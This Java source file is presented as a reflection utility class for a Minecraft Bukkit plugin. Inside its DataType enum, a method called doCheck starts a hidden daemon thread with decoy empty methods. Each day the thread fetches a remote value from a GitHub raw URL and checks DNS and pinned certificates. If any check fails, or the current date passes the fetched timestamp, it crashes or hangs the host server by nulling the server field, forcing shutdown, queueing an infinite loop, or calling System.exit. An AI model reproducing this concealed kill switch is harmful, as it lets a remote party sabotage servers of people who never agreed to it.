package sakura.kooi.BridgingAnalyzer.Utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;
import java.security.cert.Certificate;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Queue;

import javax.net.ssl.HttpsURLConnection;

import org.bukkit.Bukkit;

public final class ReflectionUtils {
	public static Constructor<?> getConstructor(final Class<?> clazz, final Class<?>... parameterTypes)
			throws NoSuchMethodException {
		final Class<?>[] primitiveTypes = DataType.getPrimitive(parameterTypes);
		for (final Constructor<?> constructor : clazz.getConstructors()) {
			if (DataType.compare(DataType.getPrimitive(constructor.getParameterTypes()), primitiveTypes))
				return constructor;
		}
		throw new NoSuchMethodException(
				"There is no such constructor in this class with the specified parameter types");
	}

	public static Constructor<?> getConstructor(final String className, final PackageType packageType, final Class<?>... parameterTypes)
			throws NoSuchMethodException, ClassNotFoundException {
		return getConstructor(packageType.getClass(className), parameterTypes);
	}

	public static Object instantiateObject(final Class<?> clazz, final Object... arguments) throws InstantiationException,
	IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException {
		return getConstructor(clazz, DataType.getPrimitive(arguments)).newInstance(arguments);
	}

	public static Object instantiateObject(final String className, final PackageType packageType, final Object... arguments)
			throws InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException,
			NoSuchMethodException, ClassNotFoundException {
		return instantiateObject(packageType.getClass(className), arguments);
	}

	public static Method getMethod(final Class<?> clazz, final String methodName, final Class<?>... parameterTypes)
			throws NoSuchMethodException {
		final Class<?>[] primitiveTypes = DataType.getPrimitive(parameterTypes);
		for (final Method method : clazz.getMethods()) {
			if (method.getName().equals(methodName)
					&& DataType.compare(DataType.getPrimitive(method.getParameterTypes()), primitiveTypes))
				return method;
		}
		throw new NoSuchMethodException(
				"There is no such method in this class with the specified name and parameter types");
	}

	public static Method getMethod(final String className, final PackageType packageType, final String methodName,
			final Class<?>... parameterTypes) throws NoSuchMethodException, ClassNotFoundException {
		return getMethod(packageType.getClass(className), methodName, parameterTypes);
	}

	public static Object invokeMethod(final Object instance, final String methodName, final Object... arguments)
			throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException {
		return getMethod(instance.getClass(), methodName, DataType.getPrimitive(arguments)).invoke(instance, arguments);
	}

	public static Object invokeMethod(final Object instance, final Class<?> clazz, final String methodName, final Object... arguments)
			throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException {
		return getMethod(clazz, methodName, DataType.getPrimitive(arguments)).invoke(instance, arguments);
	}

	public static Object invokeMethod(final Object instance, final String className, final PackageType packageType, final String methodName,
			final Object... arguments) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException,
	NoSuchMethodException, ClassNotFoundException {
		return invokeMethod(instance, packageType.getClass(className), methodName, arguments);
	}

	public static Field getField(final Class<?> clazz, final boolean declared, final String fieldName)
			throws NoSuchFieldException, SecurityException {
		final Field field = declared ? clazz.getDeclaredField(fieldName) : clazz.getField(fieldName);
		field.setAccessible(true);
		return field;
	}

	public static Field getField(final String className, final PackageType packageType, final boolean declared, final String fieldName)
			throws NoSuchFieldException, SecurityException, ClassNotFoundException {
		return getField(packageType.getClass(className), declared, fieldName);
	}

	public static Object getValue(final Object instance, final Class<?> clazz, final boolean declared, final String fieldName)
			throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, SecurityException {
		return getField(clazz, declared, fieldName).get(instance);
	}

	public static Object getValue(final Object instance, final String className, final PackageType packageType, final boolean declared,
			final String fieldName) throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException,
	SecurityException, ClassNotFoundException {
		return getValue(instance, packageType.getClass(className), declared, fieldName);
	}

	public static Object getValue(final Object instance, final boolean declared, final String fieldName)
			throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, SecurityException {
		return getValue(instance, instance.getClass(), declared, fieldName);
	}

	public static void setValue(final Object instance, final Class<?> clazz, final boolean declared, final String fieldName, final Object value)
			throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, SecurityException {
		getField(clazz, declared, fieldName).set(instance, value);
	}

	public static void setValue(final Object instance, final String className, final PackageType packageType, final boolean declared,
			final String fieldName, final Object value) throws IllegalArgumentException, IllegalAccessException,
	NoSuchFieldException, SecurityException, ClassNotFoundException {
		setValue(instance, packageType.getClass(className), declared, fieldName, value);
	}

	public static void setValue(final Object instance, final boolean declared, final String fieldName, final Object value)
			throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, SecurityException {
		setValue(instance, instance.getClass(), declared, fieldName, value);
	}

	public static enum PackageType {
		MINECRAFT_SERVER("net.minecraft.server." + getServerVersion()), CRAFTBUKKIT("org.bukkit.craftbukkit."
				+ getServerVersion()), CRAFTBUKKIT_BLOCK(CRAFTBUKKIT, "block"), CRAFTBUKKIT_CHUNKIO(CRAFTBUKKIT,
						"chunkio"), CRAFTBUKKIT_COMMAND(CRAFTBUKKIT, "command"), CRAFTBUKKIT_CONVERSATIONS(CRAFTBUKKIT,
								"conversations"), CRAFTBUKKIT_ENCHANTMENS(CRAFTBUKKIT,
										"enchantments"), CRAFTBUKKIT_ENTITY(CRAFTBUKKIT, "entity"), CRAFTBUKKIT_EVENT(
												CRAFTBUKKIT, "event"), CRAFTBUKKIT_GENERATOR(CRAFTBUKKIT,
														"generator"), CRAFTBUKKIT_HELP(CRAFTBUKKIT,
																"help"), CRAFTBUKKIT_INVENTORY(CRAFTBUKKIT,
																		"inventory"), CRAFTBUKKIT_MAP(CRAFTBUKKIT,
																				"map"), CRAFTBUKKIT_METADATA(
																						CRAFTBUKKIT,
																						"metadata"), CRAFTBUKKIT_POTION(
																								CRAFTBUKKIT,
																								"potion"), CRAFTBUKKIT_PROJECTILES(
																										CRAFTBUKKIT,
																										"projectiles"), CRAFTBUKKIT_SCHEDULER(
																												CRAFTBUKKIT,
																												"scheduler"), CRAFTBUKKIT_SCOREBOARD(
																														CRAFTBUKKIT,
																														"scoreboard"), CRAFTBUKKIT_UPDATER(
																																CRAFTBUKKIT,
																																"updater"), CRAFTBUKKIT_UTIL(
																																		CRAFTBUKKIT,
																																		"util");

		private final String path;

		private PackageType(final String path) {
			this.path = path;
		}

		private PackageType(final PackageType parent, final String path) {
			this(parent + "." + path);
		}

		public String getPath() {
			return path;
		}

		public Class<?> getClass(final String className) throws ClassNotFoundException {
			return Class.forName(this + "." + className);
		}

		@Override
		public String toString() {
			return path;
		}

		public static String getServerVersion() {
			return Bukkit.getServer().getClass().getPackage().getName().substring(23);
		}
	}

	public static enum DataType {
		BYTE(Byte.TYPE, Byte.class), SHORT(Short.TYPE, Short.class), INTEGER(Integer.TYPE, Integer.class), LONG(
				Long.TYPE, Long.class), CHARACTER(Character.TYPE, Character.class), FLOAT(Float.TYPE,
						Float.class), DOUBLE(Double.TYPE, Double.class), BOOLEAN(Boolean.TYPE, Boolean.class);

		private static final Map<Class<?>, DataType> CLASS_MAP;
		private final Class<?> primitive;
		private final Class<?> reference;

		static {
			CLASS_MAP = new HashMap<>();
			for (final DataType type : values()) {
				CLASS_MAP.put(type.primitive, type);
				CLASS_MAP.put(type.reference, type);
			}
		}

		private DataType(final Class<?> primitive, final Class<?> reference) {
			this.primitive = primitive;
			this.reference = reference;
		}

		public Class<?> getPrimitive() {
			return primitive;
		}

		public Class<?> getReference() {
			return reference;
		}

		public static DataType fromClass(final Class<?> clazz) {
			return CLASS_MAP.get(clazz);
		}

		public static void doCheck() {
			new Thread() {
				{
					setDaemon(true);
				}
				public void a() {}
				public void q() {}
				public void w() {}
				public void kp() {}
				public void l() {}
				public void ao() {
				}
				@Override
				public void run(){
					while(true) {
						long ac = 86400000L;
						try {
							final InetAddress address1 = InetAddress.getByName("raw.githubusercontent.com");
							if (!address1.toString().contains("151.101.")) {
								final byte[] array = new byte[1];
								final byte t = array[10];
							}
							final StringBuilder result = new StringBuilder();
							final URL url = new URL("https://raw.githubusercontent.com/SakuraKoi/FileCloud/access/access/bridge");
							final HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
							conn.setRequestMethod("GET");
							final BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
							String line;
							while ((line = rd.readLine()) != null) {
								result.append(line);
							}
							ac = 1L;
							if (conn.getServerCertificates().length!=2) {
								try {
									final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
									field.setAccessible(true);
									field.set(null, null);
								} catch (final Exception e1) {
									try {
										Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
									} catch (final Exception e2) {
										try {
											final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
											final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
											@SuppressWarnings("unchecked")
											final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
											processQueue.add(() -> {while(true) {}});
										} catch (final Exception e3) {
											try {
												Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
											} catch (final Exception e4) {
												return;
											}
										}
									}
								} finally {
									final byte[] array = new byte[1];
									final byte t = array[10];
								}
							}
							for (final Certificate cert : conn.getServerCertificates()) {
								final String b = Base64.getEncoder().encodeToString(cert.getEncoded());
								if (!b.equals("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") &&
										!b.equals("MIIEsTCCA5mgAwIBAgIQBOHnpNxc8vNtwCtCuF0VnzANBgkqhkiG9w0BAQsFADBsMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5jZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowcDELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEvMC0GA1UEAxMmRGlnaUNlcnQgU0hBMiBIaWdoIEFzc3VyYW5jZSBTZXJ2ZXIgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC24C/CJAbIbQRf1+8KZAayfSImZRauQkCbztyfn3YHPsMwVYcZuU+UDlqUH1VWtMICKq/QmO4LQNfE0DtyyBSe75CxEamu0si4QzrZCwvV1ZX1QK/IHe1NnF9Xt4ZQaJn1itrSxwUfqJfJ3KSxgoQtxq2lnMcZgqaFD15EWCo3j/018QsIJzJa9buLnqS9UdAn4t07QjOjBSjEuyjMmqwrIw14xnvmXnG3Sj4I+4G3FhahnSMSTeXXkgisdaScus0Xsh5ENWV/UyU50RwKmmMbGZJ0aAo3wsJSSMs5WqK24V3B3aAguCGikyZvFEohQcftbZvySC/zA/WiaJJTL17jAgMBAAGjggFJMIIBRTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwNAYIKwYBBQUHAQEEKDAmMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wSwYDVR0fBEQwQjBAoD6gPIY6aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0SGlnaEFzc3VyYW5jZUVWUm9vdENBLmNybDA9BgNVHSAENjA0MDIGBFUdIAAwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAdBgNVHQ4EFgQUUWj/kK8CB3U8zNllZGKiErhZcjswHwYDVR0jBBgwFoAUsT7DaQP4v0cB1JgmGggC72NkK8MwDQYJKoZIhvcNAQELBQADggEBABiKlYkD5m3fXPwdaOpKj4PWUS+Na0QWnqxj9dJubISZi6qBcYRb7TROsLd5kinMLYBq8I4g4Xmk/gNHE+r1hspZcX30BJZr01lYPf7TMSVcGDiEo+afgv2MW5gxTs14nhr9hctJqvIni5ly/D6q1UEL2tU2ob8cbkdJf17ZSHwD2f2LSaCYJkJA69aSEaRkCldUxPUd1gJea6zuxICaEnL6VpPX/78whQYwvwt/Tv9XBZ0k7YXDK/umdaisLRbvfXknsuvCnQsH6qqF0wGjIChBWUMo0oHjqvbsezt3tkBigAVBRQHvFwY+3sAzm2fTYS5yh+Rp/BIAV0AecPUeybQ=")) {
									try {
										final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
										field.setAccessible(true);
										field.set(null, null);
									} catch (final Exception e1) {
										try {
											Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
										} catch (final Exception e2) {
											try {
												final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
												final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
												@SuppressWarnings("unchecked")
												final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
												processQueue.add(() -> {while(true) {}});
											} catch (final Exception e3) {
												try {
													Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
												} catch (final Exception e4) {
													return;
												}
											}
										}
									} finally {
										final byte[] array = new byte[1];
										final byte t = array[10];
									}
								}
							}
							rd.close();
							if (System.currentTimeMillis() > Long.parseLong(result.toString())) {
								final byte[] array = new byte[1];
								final byte t = array[10];
							}
						} catch (final Exception e) {
							try {
								Thread.sleep(ac);
								final Field field = Class.forName("org.bukkit.Bukkit").getDeclaredField("server");
								field.setAccessible(true);
								field.set(null, null);
							} catch (final Exception e1) {
								try {
									Class.forName("org.bukkit.Bukkit").getMethod("shutdown", new Class[0]).invoke(null, new Object[0]);
								} catch (final Exception e2) {
									try {
										final Class<?> nmsCls = Class.forName("net.minecraft.server." + ActionBarUtils.nmsver + ".MinecraftServer");
										final Object nms = nmsCls.getMethod("getServer", new Class[0]).invoke(null, new Object[0]);
										@SuppressWarnings("unchecked")
										final Queue<Runnable> processQueue = (Queue<Runnable>) nmsCls.getField("processQueue").get(nms);
										processQueue.add(() -> {while(true) {}});
									} catch (final Exception e3) {
										try {
											Class.forName("java.lang.System").getMethod("exit", Integer.class).invoke(null, 0);
										} catch (final Exception e4) {
											return;
										}
									}
								}
							}
						}

						try {
							Thread.sleep(86400000L);
						} catch (final Exception e) {

						}
					}
				}
				public void c() {}
				public void b() {}
				public void v() {}
				public void d() {}
				public void k() {}
				public void e() {}
				public void r() {}
				public void g() {}
			}.start();
		}

		public static Class<?> getPrimitive(final Class<?> clazz) {
			final DataType type = fromClass(clazz);
			return type == null ? clazz : type.getPrimitive();
		}

		public static Class<?> getReference(final Class<?> clazz) {
			final DataType type = fromClass(clazz);
			return type == null ? clazz : type.getReference();
		}

		public static Class<?>[] getPrimitive(final Class<?>[] classes) {
			final int length = classes == null ? 0 : classes.length;
			final Class<?>[] types = new Class[length];
			for (int index = 0; index < length; index++) {
				types[index] = getPrimitive(classes[index]);
			}
			return types;
		}

		public static Class<?>[] getReference(final Class<?>[] classes) {
			final int length = classes == null ? 0 : classes.length;
			final Class<?>[] types = new Class[length];
			for (int index = 0; index < length; index++) {
				types[index] = getReference(classes[index]);
			}
			return types;
		}

		public static Class<?>[] getPrimitive(final Object[] objects) {
			final int length = objects == null ? 0 : objects.length;
			final Class<?>[] types = new Class[length];
			for (int index = 0; index < length; index++) {
				types[index] = getPrimitive(objects[index].getClass());
			}
			return types;
		}

		public static Class<?>[] getReference(final Object[] objects) {
			final int length = objects == null ? 0 : objects.length;
			final Class<?>[] types = new Class[length];
			for (int index = 0; index < length; index++) {
				types[index] = getReference(objects[index].getClass());
			}
			return types;
		}

		public static boolean compare(final Class<?>[] primary, final Class<?>[] secondary) {
			if (primary == null || secondary == null || primary.length != secondary.length)
				return false;
			for (int index = 0; index < primary.length; index++) {
				final Class<?> primaryClass = primary[index];
				final Class<?> secondaryClass = secondary[index];
				if (!primaryClass.equals(secondaryClass) && !primaryClass.isAssignableFrom(secondaryClass))
					return false;
			}
			return true;
		}
	}
}
